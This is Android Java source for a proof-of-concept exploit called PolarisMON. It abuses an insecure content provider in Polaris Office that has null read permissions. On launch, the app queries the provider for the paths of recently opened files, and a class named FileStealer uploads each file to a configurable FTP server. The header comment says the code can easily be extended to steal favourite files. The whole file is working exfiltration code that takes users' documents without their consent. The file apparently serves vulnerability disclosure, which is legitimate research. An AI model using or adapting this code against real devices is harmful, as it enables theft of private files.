/*
 * PolarisMON:
 * PolarisMON is a simple proof of concept of an Android application abusing content providers with sensitive information
 * and null read permissions.
 * This application queries the insecure content provider to obtain a list of file paths of recent files and 
 * uploads them to a FTP server. This PoC can be easily extended to steal favorite files as well.
 * 
 *  Paulino Calderon <calderon@websec.mx>
 */

package mx.websec.polarismon;

import java.io.File;
import java.io.FileInputStream;
import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.util.Log;
import android.view.Menu;

public class MainActivity extends Activity {

	public static String ACTIVITY_TAG = "WEBSEC";
	//This is the vulnerable content provider uri
	public static String POLARIS_CONTENT_URI = "content://com.infraware.polarisoffice/recent_files";
	
	public static String FTP_HOSTNAME = "";
	public static String FTP_USER = "";
	public static String FTP_PWD = "";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		ContentResolver resolver = getContentResolver();
		Uri uri = Uri.parse(POLARIS_CONTENT_URI);
		Cursor cursor = resolver.query(uri,null,null,null,null);
		
		if (cursor.moveToFirst()) {
			int i = 0;
			do {
				String fn = cursor.getString(5);
				String fn_parts[] = fn.split("polaris_office_recent://");
				Log.d(ACTIVITY_TAG,"Recent File Found:"+fn_parts[1]);
				
			    new FileStealer().execute(fn_parts[1]);
			    i++;
			} while (cursor.moveToNext());
			Log.d(ACTIVITY_TAG, "# recent files found:" + i);
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		return true;
	}
	
	/*
	 * Dumb function to steal files. We could be more sneaky but we dont like script kiddies
	 */
	class FileStealer extends AsyncTask<String, Integer, String> {
		protected void onPreExecute() {
		      super.onPreExecute();
		      Log.d(ACTIVITY_TAG, "Starting file download...");
		   }

		   protected void onProgressUpdate(Integer... values) {
		      super.onProgressUpdate(values);
		   }

		   protected void onPostExecute(String n) {
		      Log.d(ACTIVITY_TAG, "File transfer completed.");
		   }
		
		public boolean steal(String file) {
			Log.d(ACTIVITY_TAG,"Uploading file to remote server...");
			
			FTPClient con = null;
			try {
				con = new FTPClient();
				con.connect(FTP_HOSTNAME);

				if (con.login(FTP_USER, FTP_PWD))
				{
					con.enterLocalPassiveMode();
					con.setFileType(FTP.BINARY_FILE_TYPE);
					Log.d(ACTIVITY_TAG, "Connected to remote FTP...");
					
					FileInputStream in = new FileInputStream(new File(file));
					String file_frags[] = file.split("/");
					String fn = "/"+file_frags[file_frags.length-1];
					Log.d(ACTIVITY_TAG, "Uploading file:"+fn);
					boolean result = con.storeFile(fn, in);
					
					in.close();
					con.logout();
					con.disconnect();
					if (result) Log.v(ACTIVITY_TAG, "Transfer completed:"+fn);
				}
			} catch (Exception e) {
				Log.e(ACTIVITY_TAG, "FTP Connection failed:"+e.toString());
				return false;
			}
			return true;
		}

		protected String doInBackground(String ... arg0) {
			Log.d(ACTIVITY_TAG, "Stealing file "+arg0[0]);
		    steal(arg0[0]);
		    return "All Done!";
		}
	}
}
